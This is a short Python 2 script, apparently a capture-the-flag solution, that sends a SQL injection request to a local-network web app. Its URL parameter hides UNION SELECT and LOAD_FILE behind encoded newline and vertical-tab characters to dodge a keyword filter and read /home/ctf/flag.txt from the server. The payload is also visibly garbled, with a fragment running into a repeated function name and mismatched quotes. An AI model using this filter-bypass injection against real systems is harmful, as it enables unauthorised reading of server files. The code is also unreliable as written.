import urllib2


url ="http://192.168.50.6:30465/index.php?id=1000%0Aunion%0ASELECT%0ALOAD_F%0bILELOAD_FILE('/home/ctf/flag.txt\")"
print urllib2.urlopen(url).read()

